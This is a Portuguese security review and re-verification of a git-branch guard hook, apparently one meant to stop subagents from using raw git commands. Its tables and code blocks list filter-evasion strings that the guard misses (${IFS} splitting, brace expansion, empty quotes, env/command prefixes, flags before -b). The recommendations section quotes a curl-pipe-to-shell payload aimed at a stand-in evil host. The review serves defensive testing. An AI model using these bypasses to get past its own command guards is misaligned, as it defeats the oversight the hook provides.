# Revisão de segurança — `git-branch-guard` (ML-1A / ML-4A)

> Autor: `hades-tf` | Data: 2026-08-16
> Escopo: `scripts/trackfw-git-branch-guard.sh` e as 5 outras cópias sincronizadas, alteradas pelo
> ML-1A do `ROADMAP-2026-08-16-higiene-sete-debitos-acumulados-da-entrega-de-plugins-e-da-release-7-0-0.md`.
> Método: leitura do código + **execução direta** do script contra os dois payloads que o arquiteto
> já havia medido, mais um conjunto adversarial próprio (não coberto pelos cenários 60/61 nem pelos
> testes Go/Node/Python existentes).

## Veredito

**BLOQUEAR.**

**Base do veredito, para não ficar ambíguo:** rodei a bateria adversarial completa (A1–A4, B1)
também contra a versão do guard **anterior** ao ML-1A (`git show b9ced66^:scripts/trackfw-git-branch-guard.sh`,
o commit imediatamente antes deste ML). **Todos os vetores já passavam no guard antigo** — ML-1A
não regrediu nenhum deles. O delta próprio do ML-1A está limpo e verificado: a prosa que antes
bloqueava incorretamente agora passa (`exit 0`), e `git switch -c` que antes passava incorretamente
agora bloqueia (`exit 2`) — exatamente o que o ML se propôs a fazer, sem efeito colateral.

**Então por que bloquear um ML cujo próprio diff está limpo?** Porque o ML não se limitou a corrigir
o que se propôs: reescreveu a segmentação inteira e a vendeu, no comentário do script e na nota de
execução do roadmap, como "segmentação *quote-aware*" — linguagem que sugere um nível de robustez
contra evasão que o guard **nunca teve e continua sem ter**. Isso é o cenário que a barreira foi
desenhada para pegar: **confiança falsa é pior que guard nenhum**, porque um controle que ninguém
acredita ser sólido continua sendo tratado com cautela; um controle "corrigido" e testado que ainda
tem bypasses triviais (inclusive um que **executa `git push` de verdade** — reproduzi a execução,
não só a leitura, e só não houve push remoto porque a branch local de teste não tinha upstream)
convida a esse ML ser citado como "o guard agora é robusto", quando não é. O bloqueio é sobre isso:
a lacuna é pré-existente, mas o ML criou um cenário de falsificação (60/61) e comentários que
implicam cobertura que não existe — e não há, em lugar nenhum do roadmap ou do ADR, uma declaração
explícita de que A1–A4/B1 ficam abertos. Depois desta barreira, essa declaração passa a ser
obrigatória (ou a correção).

## O que foi medido (não inferido)

Todos os comandos abaixo foram executados literalmente contra
`./scripts/trackfw-git-branch-guard.sh` (idêntico às outras 5 cópias — ver seção C).

### A — A correção do falso-positivo abriu evasão real? **Nenhum vetor é regressão do ML-1A — mas 4 já existiam e continuam abertos**

| # | Vetor | Comando testado | Guard | Bash real |
|---|---|---|---|---|
| A1 | **Expansão de `${IFS}` não quotada** | `git${IFS}push` | `exit 0` (permite) | `bash -c 'echo git${IFS}push'` → `git push` (duas palavras) |
| A2 | **Brace expansion como o próprio comando** | `{git,push}` | `exit 0` (permite) | `bash -c '{git,push} --dry-run'` → **executou `git push` de verdade**, saída `fatal: ... has no upstream branch` (não houve push real só porque a branch de teste não tem upstream — se tivesse, o push teria ocorrido) |
| A3 | **Concatenação de aspas vazias dentro da palavra** | `g""it push` | `exit 0` (permite) | `bash -c 'echo g""it push'` → `git push` |
| A4 | **Prefixo `env`/`command`** | `env git commit -m "x"` / `command git push` | `exit 0` (permite) | qualquer shell POSIX: `env git commit` e `command git push` executam `git commit`/`git push` literalmente — não é obfuscação, é uso normal de `env`/`command` |

**Causa raiz comum, não três bugs separados:** `match_subcommand()` faz *word-splitting* ingênuo
(`set -- $seg_trimmed`) sobre o texto bruto, sem nunca *avaliar* o texto como o shell real avalia.
O guard trata `git${IFS}push`, `{git,push}` e `g""it push` como um único token opaco — nenhum deles
é igual à string literal `"git"` — então `[ "$base" = "git" ] || continue` nunca dispara. O **bash
real que efetivamente executa o comando**, porém, faz expansão de parâmetro, expansão de chaves e
remoção de aspas *antes* de decidir quais são os "argv[0]" e os argumentos — produzindo exatamente
`git push` como dois tokens reais. O guard não é um parser de shell; ele confia que o texto já vem
tokenizado como o autor pretendia, e isso é falso para qualquer subagente (ou humano) que use essas
construções — nenhuma delas é exótica, são idiomas conhecidos de evasão de filtros de comando
baseados em string.

**A4 tem causa distinta, mesma classe:** `[ "$base" = "git" ] || continue` só dispara quando o
**primeiro** token do segmento é (por basename) `git`. Em `env git commit -m x`, o primeiro token é
`env` — a checagem falha, o `continue` pula para o próximo segmento, e como não há mais segmentos
(não há `;`/`&&`/etc.), a função retorna sem nunca examinar `git` como segundo token. `command git
push` é idêntico. Nenhum dos dois é uma técnica de disfarce — são as formas *padrão* de invocar um
programa ignorando alias/função (`command`) ou com ambiente customizado (`env`), amplamente usadas
em scripts legítimos.

**Regressão? Medido, não inferido — nenhuma.** Peguei a versão do guard imediatamente anterior a
este ML (`git show b9ced66^:scripts/trackfw-git-branch-guard.sh`, o `sed` cego que a nota do ML
substituiu) e rodei os mesmos payloads A1–A4 e B1 contra ela: **`exit 0` (permite) em todos**,
idêntico ao guard atual. `match_subcommand`/`quote_aware_split` deste ML mudam a forma como
separadores (`;`, `&&`, `||`, `|`, heredoc) dentro de aspas são neutralizados — não tocam em `$`,
`{`, aspas vazias adjacentes, nem em prefixos `env`/`command`. A lacuna é **pré-existente e
inalterada** pelo ML-1A; o que preocupa não é o ML tê-la criado (não criou), é o ML descrever a nova
segmentação como "quote-aware" sem qualificar que isso resolve só separadores citados, não
tokenização geral — ver "Base do veredito" no topo.

### A (secundário) — vetores testados que **não** funcionaram (path feliz confirmado)

```
./scripts/trackfw-git-branch-guard.sh 'trackfw commit -m "veja: git status; git push é bloqueado"' -> exit 0  (correto)
./scripts/trackfw-git-branch-guard.sh 'git commit -m "x"; git push'                                 -> exit 2  (correto)
./scripts/trackfw-git-branch-guard.sh 'git switch -c nova'                                          -> exit 2  (correto)
```
Prosa com heredoc, comandos reais encadeados por `;`/`&&`/`||`/`|`, `switch -c/-C/--create` com flag
antes, path absoluto (`/usr/bin/git`) — todos continuam bloqueados como esperado. A regressão
verificada por leitura de `internal/generators/git_branch_guard_test.go` (28 testes Go) mais os
Cenários 60/61 do `check-gates-falsify.sh` cobre bem esse eixo. **O problema não é regressão no que
já era testado — é ausência total de cobertura para A1/A2/A3/A4.**

### Vetores adicionais testados, sem sucesso de evasão

```
git -c user.name=x commit -m x     -> bloqueado (flags -c/-C globais são corretamente puladas)
git\n commit                        -> segue tratado como prosa/segmento, não bypassa commit real
```

(Ambos também bloqueados na versão pré-ML-1A — não são achado novo nem risco residual introduzido.)

## B — A brecha de `git switch -c` foi fechada? **Parcialmente — achei uma variante irmã não fechada**

`switch -c/-C/--create/--force-create` está corretamente bloqueado, inclusive com flag antes
(`git switch --track -c feat/x`). Testei variantes adjacentes:

| Comando | Resultado medido | Esperado? |
|---|---|---|
| `git checkout -b nova` | `exit 2` bloqueado | ✅ |
| `git checkout -q -b nova` | **`exit 0` — passa** | ❌ bypass |
| `git checkout --no-track -b nova` | **`exit 0` — passa** | ❌ bypass |
| `git checkout --quiet -b nova` | **`exit 0` — passa** | ❌ bypass |
| `git worktree add -b nova ../wt` | `exit 0` — passa | ⚠️ não coberto pelo escopo declarado, mas cria branch de verdade |
| `git checkout --orphan nova` | `exit 0` — passa | ⚠️ cria (órfã) e troca de branch; fora do escopo declarado mas mesma classe |
| `git branch nova` + depois `git checkout nova` (dois comandos separados) | ambos `exit 0` | ⚠️ contorna a intenção de "checkout -b" em dois passos; `checkout` sem `-b` é **intencionalmente** permitido (troca de branch existente é uso legítimo) — ver nota abaixo |

**B1 é o achado sério deste bloco:** o matcher de `checkout` só verifica se o **token
imediatamente seguinte** a `checkout` é literalmente `-b` (`if [ "${1:-}" = "-b" ]`). Isso é
assimétrico em relação ao matcher de `switch`, que varre **todos** os tokens remanescentes
procurando por `-c/-C/--create` — comentário do próprio script até documenta essa escolha para
`switch --track -c feat/x`, mas o mesmo cuidado não foi aplicado a `checkout`. Qualquer flag entre
`checkout` e `-b` (`-q`, `--quiet`, `--no-track`, `--progress`, etc. — todas flags reais e comuns do
`git checkout`) evade a detecção. O teste Go `TestGitBranchGuard_CheckoutDashB_WithFlagsBefore_Blocks`
testa **apenas** `-C .` (uma flag *global* do git, antes do subcommand, consumida pelo laço
`-C|-c|--work-tree|--git-dir|--namespace`), não uma flag *entre* `checkout` e `-b` — não cobre B1.
**Também pré-existente, não regressão:** confirmado contra o guard anterior ao ML-1A — a checagem
`if [ "${1:-}" = "-b" ]` para `checkout` não foi tocada por este ML (só a detecção de `switch` foi
adicionada), e o mesmo `exit 0` já ocorria antes.

**B2, `git worktree add -b` / `checkout --orphan`, é fora do escopo textual do item 2** (que fala
especificamente de "forma alternativa a `checkout -b`", ou seja, `switch -c`), mas cria branches de
verdade sem passar pelo `trackfw branch new` — reporto porque a barreira pediu para não me limitar à
"felicidade" do caminho já coberto.

**B3, o dois-passos `branch` + `checkout`, é uma limitação de design pré-existente e não uma
regressão deste ML** — bloquear `git checkout <nome-existente>` sem `-b` quebraria uso legítimo
constante (trocar de branch já existente é rotina). Registro como risco residual aceito, não como
achado a corrigir aqui.

## C — As cópias seguem íntegras? **SIM, confirmado por execução, não só por leitura**

1. Extraí programaticamente o conteúdo que `internal/generators/scaffold.go`'s
   `GenerateGitBranchGuardScript` realmente escreve (rodei o gerador Go de verdade contra um
   diretório temporário) e comparei byte a byte com `scripts/trackfw-git-branch-guard.sh`:
   **`diff` vazio, idênticos.**
2. Rodei `go test ./internal/generators/... -run GitBranchGuard -v`: **28/28 testes verdes**,
   incluindo `TestGitBranchGuard_ChainedCommand_SecondGitBlocked`,
   `TestGitBranchGuard_SwitchDashC_Blocks`, `TestGitBranchGuard_SwitchDashC_FlagBeforeCreate_Blocks`,
   `TestGitBranchGuard_CommitMessageLineStartingWithGitCheckoutDashB_DoesNotBlock`.
3. Rodei `node --test npm/tests/git_branch_guard.test.js npm/tests/git_branch_guard_hook_integrity.test.js`:
   **39 + 16 passaram**, incluindo o teste explícito `GIT_BRANCH_GUARD_SCRIPT_REFERENCE é
   byte-idêntico ao que generateGitBranchGuardScript emite` e `git_branch_guard_script_integrity: 1
   byte alterado dispara violação` (prova que o comparador de integridade não é vácuo).
4. Rodei `python3 -m pytest pypi/tests/test_git_branch_guard.py pypi/tests/test_git_branch_guard_validator.py`:
   **43 passed, 2 subtests passed.**
5. `trackfw validate` (binário real `bin/trackfw`) roda limpo com **0 erros** (16 warnings, todos
   sobre REQs sem ADR/roadmap linkado — nada relacionado ao guard).

Conclusão: as 6 cópias estão **byte-idênticas hoje**, confirmado por execução real (não só leitura).
Item C: **íntegro, aprovado.**

**Ressalva sobre o tipo de cobertura, para não superestimar a garantia:** o que medi cobre
Go-const == `scripts/`-referência (diff direto, meu) e, dentro de cada stack, gerador == referência
de integridade do próprio validador (`GIT_BRANCH_GUARD_SCRIPT` vs `GIT_BRANCH_GUARD_SCRIPT_REFERENCE`
em Node; equivalente em Python). **Não existe** um teste que gere o script pelos 3 stacks e compare
os três resultados entre si numa única asserção — ao contrário do credential-guard, que tem
`TestCredentialGuardScript_ParityAcrossStacks` (`internal/generators/credential_guard_test.go:125`)
comparando Go vs Node vs Python diretamente. Busquei o equivalente para o git-branch-guard
(`grep -rn ParityAcrossStacks internal/generators/*.go` e `grep -rln trackfw-git-branch-guard
scripts/check-*parity*.sh`) e **não encontrei nenhum**. Hoje as 6 cópias batem porque cada uma foi
atualizada manualmente em conjunto (a nota de execução do ML-1A confirma isso) e os testes por-stack
passam — mas nada impede duas delas divergirem no futuro com `make quality` inteiramente verde,
porque não há uma única asserção cruzando os 3 stacks para este script específico. Não é o achado
principal desta barreira, mas é uma lacuna de cobertura real — registro para o corretor considerar
um `TestGitBranchGuardScript_ParityAcrossStacks` no mesmo molde do credential-guard.

## Cobertura de falsificação (P4) — suficiente para A/B só parcialmente

Os Cenários 60/61 de `check-gates-falsify.sh` provam exatamente o que o arquiteto mediu (switch-c
bloqueado, prosa permitida) e provam não-vacuidade (corrompendo o literal correspondente no gerador
Go e confirmando que o comportamento volta a vazar). **Isso é suficiente para o que os cenários se
propõem a testar — mas não cobre nenhum dos achados A1/A2/A3/A4/B1 acima**, porque nenhum deles
depende de um "literal corrompido"; são lacunas estruturais do algoritmo de tokenização em si,
presentes até no código são.

## Risco residual, se o veredito fosse aprovar (não é — registrado para o corretor)

Mesmo depois de corrigir A1–A4 e B1, o guard continuará sendo um filtro de string sobre o texto do
comando, não um parser de shell — `eval`, funções shell definidas antes, aliases de git
(`git -c alias.x="push" x`), ou um subagente que grava um script `.sh` e o executa via `bash foo.sh`
continuam fora do alcance de qualquer guard desta classe. Isso é aceitável como limite de design
(documentado no próprio comentário do script: "tripwire para o caso óbvio, não defesa contra um
adversário competente" — mesma linguagem usada em `CLAUDE.md` para o checker de terceiros), **mas
A1–A4 não são adversário competente: são idiomas de shell do dia a dia** (`${IFS}`, brace expansion,
aspas vazias adjacentes, `env`/`command`) — não exigem sofisticação, um subagente ou usuário poderia
produzi-los sem intenção maliciosa e ainda assim escapar do guard.

## Recomendação para quem for corrigir (não implementado aqui — fora do escopo desta barreira)

**Não** deixar o bash real avaliar/expandir o texto do comando para "tokenizar corretamente" — isso
seria pior que o problema atual. O guard roda sobre texto potencialmente controlado por quem está
tentando escapar dele; se a correção passar esse texto por qualquer forma de expansão real do shell
(`eval`, `bash -c` interpretando o texto além de citá-lo como argumento literal, `` `...` ``,
`$(...)`), um comando como `git commit -m "$(curl evil.sh | sh)"` executaria o payload **dentro do
próprio guard**, com os mesmos privilégios do hook — isto é, o "fix" abriria RCE onde hoje só há
bypass de política. Duas direções seguras, sem essa armadilha:

1. **Lexer real, sem avaliação** — usar uma biblioteca de tokenização de shell que faz *só* a
   análise léxica (remoção de aspas, reconhecimento de `$var`/`${var}`/`{a,b}` como tokens especiais
   a **recusar**, nunca a expandir) sem executar nada. Ex.: `shlex` em Python (a stack pypi já
   depende dela) ou um lexer Go equivalente (`mvdan.cc/sh/v3/syntax` faz parse sem eval). Reescrever
   o `match_subcommand` em awk/sh para reconhecer manualmente cada nova classe de obfuscação
   descoberta é o padrão atual e é exatamente por isso que A1–A4 escaparam: joga-se whack-a-mole
   contra a gramática do shell.
2. **Fail-closed sobre os próprios metacaracteres de obfuscação** — mais barato e alinhado à postura
   de "tripwire" que o script já assume: se o texto do comando contém `${`, `$(`, `` ` ``, ou um
   padrão de brace expansion (`{...,...}`) **em qualquer lugar**, bloquear (ou pedir revisão humana)
   independente de reconhecer `git` explicitamente — nenhum uso legítimo de `trackfw commit -m` ou
   `trackfw ship` deveria precisar dessas construções no texto do comando. Mais simples de auditar,
   sem risco de eval, ao custo de falsos positivos ocasionais em mensagens de commit muito elaboradas
   (aceitável para um guard que prefere bloquear demais a deixar passar).

## Escopo não coberto por esta barreira

Confirmo que os demais itens da higiene (i18n, `site/`, `cli-parity.md`, `ship`) não foram tocados
por esta revisão — fora do escopo desta barreira, como o roadmap determina.

---

## Reverificação do bloqueio (ML-4B) — `hades-tf`, 2026-08-17

> Escopo apertado: só os dois motivos do bloqueio original (claim "quote-aware" sem qualificação;
> ausência de gate de paridade 3-stacks) e a lógica NOVA introduzida pelo corretivo (stripping de
> `env`/`command`, matcher de `checkout` varrendo todos os tokens). Método: leitura do diff +
> execução direta de `./scripts/trackfw-git-branch-guard.sh` contra bateria adversarial própria,
> incluindo confirmação em repositório-escrachadinho (`/tmp/hades_scratch`) de que os vetores que
> encontrei realmente executam (ou não) no git real — não só no guard.

### Veredito: **LEVANTAR O BLOQUEIO.**

Os dois motivos que fundamentaram o bloqueio do ML-4A estão fechados, confirmados por execução:
- Header do script (7 cópias) agora diz "TRIPWIRE, NÃO FRONTEIRA DE SEGURANÇA", citando o
  `ADR-2026-08-12`. Nenhuma ocorrência de "quote-aware" sem qualificação restante (`grep -n
  "quote-aware" scripts/trackfw-git-branch-guard.sh` só retorna a linha qualificada do comentário
  da função `quote_aware_split`, que descreve o que a função faz — não uma alegação de robustez).
- `scripts/check-attention-scripts-parity.sh` cobre `trackfw-git-branch-guard.sh` nos dois loops
  (linhas 141 e 158) — confirmado por leitura e pela presença do script nas duas listas.

Nenhum dos dois motivos do bloqueio dependia de fechar as evasões pré-existentes (A1–A4/B1 do
parecer original) — eu mesmo escrevi isso na seção "Base do veredito" de 2026-08-16. Manter o
bloqueio agora, com os dois motivos fechados, contradiria o padrão que eu mesmo declarei.

### A) A lógica nova de stripping abriu algo que eu não vi?

Ataquei o stripping de `env`/`command` e o matcher de `checkout` com vetores que a auditoria do
arquiteto não cobriu. Resultado, tudo medido por execução:

```
BLOQUEIAM (consistente com o que o ML-4B prometeu):
  env git push · command git push · env command git push · command env git push
  env env env git push · env git checkout -b x

EVADEM (já declarados pelo arquiteto em AC5, confirmo por execução própria, nada novo):
  env -i git push · env --ignore-environment git push · ENV=1 env git push
  env FOO=bar git push · command -p git push · env -- git push
  env FOO=bar env git push · env env FOO=bar git push
```

**Nenhuma regressão.** Testei se o stripping poderia fazer o guard deixar de bloquear algo que
bloqueava antes — três eixos, todos negativos:
- Nome literal `env`/`command` como argumento do git (`git checkout -b env`, `git commit -m env`,
  `git push env master`) — todos continuam `exit 2`. O `while` só descasca prefixos que ocupam a
  posição de **primeiro token do segmento**, nunca um argumento posicional.
- Prosa legítima citando "env"/"command" em mensagem de commit (`trackfw commit -m "env is
  nice"`) — `exit 0`, sem falso-positivo novo.
- Formas simples que o ML-4B prometeu fechar continuam fechadas mesmo com prefixo (`env git
  checkout -q -b x`, `command git switch -c x`) — `exit 2`.

**Vetor que investiguei a pedido do revisor e que resultou não-achado, registro para não repetir o
trabalho:** o laço de flags globais (`-C|-c|--work-tree|--git-dir|--namespace)... shift 2`) pode, em
tese, "comer" o subcomando real como se fosse o valor da flag — ex. `git -c checkout -b nova`,
`git --git-dir checkout -b nova`, `git --namespace push`. Testei os quatro contra o guard: **todos
`exit 0` (evadem no matcher)**. Mas testei também contra o **git real** em repo-escrachadinho
(`/tmp/hades_scratch`, `git 2.x` do macOS) para confirmar se a evasão é real ou só um artefato do
matcher:
- `git -c checkout -b nova` → git real rejeita (`unknown option: -b`, porque `-c` exige a forma
  `name=value`, e "checkout" não é `name=value` — git nunca chega a interpretar "-b" como flag de
  subcomando).
- `git -C checkout -b nova` → git real rejeita (`fatal: cannot change to 'checkout': No such file or
  directory` — "checkout" é consumido como *caminho* de `-C`, nunca como subcomando).
- `git --git-dir checkout -b nova` → git real rejeita (`unknown option: -b` — mesma dinâmica: `checkout`
  vira o valor de `--git-dir`, sobra só `-b`/`nova`, e como `-b` não é uma flag global válida antes de
  haver um subcomando, git aborta).
- `git --namespace push` (forma space-separated) → mesma dinâmica, git real aborta com `usage: git...`
  sem nunca invocar `push`.

**Conclusão sobre este vetor: não é achado, é um descasamento de modelo mental sem efeito prático.**
O guard "erra" no sentido de que sua leitura de `-c/-C/--git-dir/--namespace` como "sempre consome um
valor e sobra um subcomando depois" é otimista — mas o próprio git é **mais restritivo** que essa
leitura (`-c` exige `=`, `-C`/`--git-dir` tratam o token seguinte como caminho, não como argumento
posicional recuperável), então a sequência de tokens que faria o guard evadir nunca é a mesma
sequência que faz o git real executar `checkout -b`/`push`. Não fechar isso é correto — fechar
introduziria complexidade no matcher sem nenhum ganho de segurança real. Não entra em AC5 como
residual (não é um residual, é um não-achado) — mas registro aqui para o próximo revisor não repetir
os ~20 min de verificação em `/tmp/hades_scratch`.

### B) O matcher novo do `checkout` tem buraco?

Confirmei por execução: `-q -b`, `--no-track -b`, `--quiet -b`, flag antes de qualquer posição
(`git checkout HEAD -b x`, `git checkout -- file -b`) — todos `exit 2`, o scan varre mesmo com
argumentos posicionais no meio. `--orphan` sozinho também fecha agora (`git checkout --orphan x` →
`exit 2`), o que o parecer original de 2026-08-16 tinha listado como aberto (B2) — **fechado como
efeito colateral do scan completo**, não estava na lista de ações do ML-4B mas resultou do mesmo
código.

Ainda abertos, sem mudança desde o parecer original, nenhum é regressão nem foi tocado por este ML:
- `git worktree add -b nova ../wt` → `exit 0`, ainda cria branch de verdade. Já registrado como B2
  no parecer original, fora do escopo textual do item 2 do ML-4B (que falava só de `checkout`/
  `switch`). Continua sem entrada própria na tabela AC5 do roadmap — ver item (C) abaixo.
- `git branch nova` (sem checkout) → `exit 0`, por design — bloquear quebraria o próprio protocolo
  de higiene de branch do `CLAUDE.md` global (`git branch -d/-D`, `git branch -r --no-merged`). Não é
  residual, é decisão de design correta.
- `git branch -c origem nova` (copia branch) → `exit 0`. Cria branch nova de verdade sem passar por
  `trackfw branch new`. Mesma classe de `git worktree add -b` — nunca mencionado em nenhum dos dois
  pareceres nem em AC5.

Não encontrei nada que faça o guard **parar de bloquear** uma forma que bloqueava antes do ML-4B —
o scan é estritamente mais abrangente (percorre todos os tokens) que o `if [ "${1:-}" = "-b" ]`
anterior, e "mais abrangente" nesse tipo de scan só pode aumentar detecção, nunca diminuir (não há
`return`/`break` prematuro que uma flag adicional possa provocar — verifiquei o `for tok2 in "$@"`,
ele sempre varre até o fim antes de desistir).

### C) A declaração AC5 é honesta ou foi suavizada?

Honesta na moldura (nenhuma linha nega ou minimiza o que mede), mas **incompleta em dois pontos** —
não por má-fé, por o autor (interessado, como o próprio texto reconhece) ter fechado o texto antes de
uma segunda rodada adversarial:

1. **`env`/`command` COM argumentos não deveria ficar como residual permanente — deveria virar item
   de correção do próximo ML, não ficar arquivado ao lado de `nice`/`sudo`/`timeout`.** A própria
   linha 266-267 do roadmap argumenta: *"Corrigir só as flags do checkout e deixar env git/command
   git abertas seria incoerente: são o mesmo custo e a mesma classe."* Esse argumento vale, com a
   mesma força, um passo adiante: `env env git push` → `exit 2`, mas `env FOO=bar git push` →
   `exit 0` — o guard bloqueia a forma contrivada e deixa passar a forma natural (`env` com
   atribuição de variável é o uso **mais comum** de `env`, mais comum que `env git push` puro). A
   própria linha 361 da tabela AC5 já concede que o fix é "pequeno" (pular tokens `-*`/`*=*` no
   `while` existente). O argumento de "corrida sem fim" da linha 358 (`nice`/`sudo`/`timeout`) é
   válido para programas arbitrários que recebem um comando como argumento — não é a mesma classe de
   `env`/`command` com argumentos, que são os dois binários que o guard **já escolheu** reconhecer.
   Meu veredito: não é motivo para reabrir o bloqueio, mas recomendo fortemente que a tabela AC5
   reclassifique esta linha de "aceito como tripwire" para "próximo ML nomeado", não uma linha a mais
   ao lado de wrappers arbitrários.

2. **Verbos que criam branch de verdade fora de `checkout`/`switch` não estão na tabela AC5.**
   `git worktree add -b` (já no parecer original, B2) e `git branch -c origem nova` (achado meu,
   nesta reverificação) criam branches reais sem passar por `trackfw branch new` e não têm nenhuma
   linha na "Declaração de não-correção (AC5)" — a tabela diz *"Nada nesta lista é omissão
   silenciosa"*, o que deixa de ser estritamente verdade enquanto esses dois ficarem de fora dela.
   Diferença de tratamento entre os dois: `git branch nova` sozinho é decisão de design correta (não
   entra na tabela, porque bloquear quebraria o protocolo documentado de branch do `CLAUDE.md`);
   `git worktree add -b` e `git branch -c` não têm esse conflito — são simplesmente casos que o
   matcher nunca tentou cobrir.

3. **A linha 357 da AC5 (evasões que exigem tokenizar como o bash) justifica a classe inteira com
   "exige tokenizar como o bash"** — verdadeiro para `${IFS}`/`{git,push}`/`g""it push` como
   *reconhecimento* de `git`, mas não é o motivo real para não adotar a recomendação #2 do meu
   parecer original (fail-closed em `${`, `$(`, backtick, chaves). Motivo real e mais forte, que a
   AC5 não menciona: o próprio protocolo de commit do `CLAUDE.md` do projeto usa
   `git commit -m "$(cat <<'EOF' ... EOF)"` como padrão documentado — fail-closed em `$(` quebraria o
   workflow oficial do projeto, não só "mensagens de commit elaboradas" como a recomendação original
   dizia. Não é motivo para reabrir (a AC5 já declara não fechar isso, e concordo que não deveria),
   só registro que o motivo dado é mais fraco que o motivo real, para quem revisar essa linha depois
   não se apoiar num argumento incompleto.

### O que NÃO bloqueia (registrado, não é achado)

- `git checkout -- -b` → `exit 2`: falso-positivo na direção segura (checkout de um arquivo chamado
  literalmente `-b`), aceitável para um tripwire que prefere bloquear demais.
- Linha 361 da AC5 (gate de paridade novo sem falsificação própria, cenário 43 cobre o mecanismo) —
  já é uma declaração honesta com escopo explícito, nada a acrescentar.

### Risco residual se o bloqueio for levantado (é o que estou fazendo)

Igual ao já registrado no parecer de 2026-08-16, mais os dois itens do bloco (C): `env`/`command` com
argumentos, `git worktree add -b`/`git branch -c` sem entrada em AC5. Nenhum é regressão deste ML,
nenhum foi introduzido por ele, e os dois motivos que fundamentaram o bloqueio original estão
fechados e verificados por execução. Recomendo ao arquiteto abrir um ML nomeado (não uma linha
perene em AC5) para o item (1) — é barato e o próprio autor já apontou o fix.
